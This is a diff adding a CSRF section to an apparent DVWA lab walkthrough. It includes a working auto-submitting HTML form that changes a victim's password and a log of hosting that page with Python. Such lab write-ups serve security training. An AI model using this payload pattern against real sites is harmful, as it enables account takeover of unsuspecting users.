@@ -201,9 +201,56 @@ we can give our arbitrary command to execute with the help of pipe `|` ,so let's
 
 _it works on all low, medium and high_
 
+<br/>
+
 ---
 
 ### Cross Site Request Forgery (CSRF)
+
+**Security level is currently: low.**
+
+<img width="827" alt="image" src="https://user-images.githubusercontent.com/79740895/185393318-096ce7f2-f881-4aee-ba63-1a6c2074fb52.png">
+
+Here we can change password, there is no csrf protection. We can create simple form to auto submit and change password of victim.
+
+<details><summary markdown="span">Click to see html code for CSRF :diamond_shape_with_a_dot_inside: </summary>
+  
+```html
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.170.131/vulnerabilities/csrf/">
+      <input type="hidden" name="password&#95;new" value="pass" />
+      <input type="hidden" name="password&#95;conf" value="pass" />
+      <input type="hidden" name="Change" value="Change" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+  
+</details>
+
+we can host this page so when victim visit page their password will automatically charged.
+
+I'm using python to host webpage:
+
+<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
+  
+```Shell
+C:\Users\AFTAB SAMA\Downloads>python -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:192.168.173.222 - - [18/Aug/2022 18:03:11] "GET /csrf-test.html HTTP/1.1" 200 -
+::ffff:192.168.173.222 - - [18/Aug/2022 18:03:12] code 404, message File not found
+::ffff:192.168.173.222 - - [18/Aug/2022 18:03:12] "GET /favicon.ico HTTP/1.1" 404 -
+```
+
+</details>
+
+
 
 ---
 
